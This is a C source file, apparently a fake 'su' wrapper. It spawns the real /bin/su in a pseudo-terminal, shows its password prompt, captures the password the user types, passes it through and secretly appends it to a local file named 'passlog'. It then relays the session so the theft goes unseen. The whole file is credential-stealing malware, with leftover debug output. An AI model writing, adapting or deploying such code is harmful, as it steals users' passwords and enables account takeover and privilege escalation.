// Cribbed heavily from Scriptjunkie's stdiobindshell.c

#include <errno.h>
#include <termios.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pty.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <signal.h>

#define BUF_SIZE 255

int forkpty(int *amaster, char *name, const struct termios *termp, const struct winsize *winp);

int main(int argc, char * const *argv)
{
    struct termios old;
    struct termios new;
    char *command;
    pid_t pid;

    int terminalfd;

    FILE *file = fopen("passlog", "a+");

    char buf[BUF_SIZE];
    char output[BUF_SIZE];

    char **su_argv = calloc(argc, sizeof(char*));

    /* Retrieve current terminal settings, turn echoing off */
    if (tcgetattr(0, &new) == -1)
    {
        perror("tcgetattr");
        exit(1);
    }

    old = new;
    /* ECHO off, other bits unchanged */
    new.c_lflag &= ~ECHO;
    printf("%p %p\n", &new, &old);

    if (tcsetattr(0, TCSAFLUSH, &new) == -1)
    {
        perror("tcsetattr");
        exit(1);
    }

    pid = forkpty(&terminalfd, (char *)NULL, NULL, NULL);
    if (pid == -1 || pid == 0)
    {
        exit(execvp("/bin/su", argv));
    }

    // read the password prompt
    int numbytes = read(terminalfd, output, BUF_SIZE - 1);
    // Display it to the user
    write(1, output, numbytes);

    // grab the password from the user
    fgets(buf, BUF_SIZE, stdin);
    //buf[strcspn(buf, "\n")] = 0;
    //buf[strlen(buf)-1] = 0;

    // forward it to su
    write(terminalfd, buf, strlen(buf));
    // And save it
    fprintf(file, "%s\n", buf);


    /* Restore original terminal settings */

    if (tcsetattr(0, TCSANOW, &old) == -1)
    {
        perror("tcsetattr");
        exit(1);
    }

    tcgetattr(0, &old); // Disable buffered I/O and echo mode for terminal emulated
    new = old;
    new.c_lflag &= ~ICANON;
    new.c_lflag &= ~ECHO;
    tcsetattr(0, TCSANOW, &new);

    fd_set rfds;
    FD_ZERO(&rfds);
    while (1)
    {
        int status;
        int numbytes;

        struct timeval tv;
        int retval;

        /* Watch stdin (fd 0) to see when it has input. */

        FD_SET(0, &rfds);
        FD_SET(terminalfd, &rfds);

        /* Wait up to five seconds. */

        tv.tv_sec = 5;
        tv.tv_usec = 0;

        retval = select(FD_SETSIZE, &rfds, NULL, NULL, &tv);

        if (retval == -1)
        {
            perror("select()");
        }
        else if (retval)
        {
            //printf("Data is available now. %d\n", retval);
            /* FD_ISSET(0, &rfds) will be true. */
        }
        else
        {
            printf("No data within five seconds.\n");
            continue;
        }

        // I don't like this big chunk of duplicate code, but I don't see an
        // easy way around it
        if (FD_ISSET(0, &rfds))
        {
            printf("Data is available from stdin. %d\n", retval);
            numbytes = read(0, buf, BUF_SIZE - 1);

            if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
            {
                if(errno == 5)
                {
                    waitpid(pid, &status, WNOHANG);
                    tcsetattr(0, TCSANOW, &old); //reset terminal
                    if (WIFEXITED(status))
                    {
                        exit(WEXITSTATUS(status));
                    } else {
                        exit(1);
                    }
                }
            }
            write(terminalfd, buf, numbytes);
        }


        if (FD_ISSET(terminalfd, &rfds))
        {
            numbytes = read(terminalfd, buf, BUF_SIZE - 1);
            printf(" %d bytes\n", numbytes);

            if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
            {
                if(errno == 5)
                {
                    waitpid(pid, &status, WNOHANG);
                    tcsetattr(0, TCSANOW, &old); //reset terminal
                    if (WIFEXITED(status))
                    {
                        exit(WEXITSTATUS(status));
                    } else {
                        exit(1);
                    }
                }
            }
            write(1, buf, numbytes);
        }

    }

    exit(EXIT_SUCCESS);

}
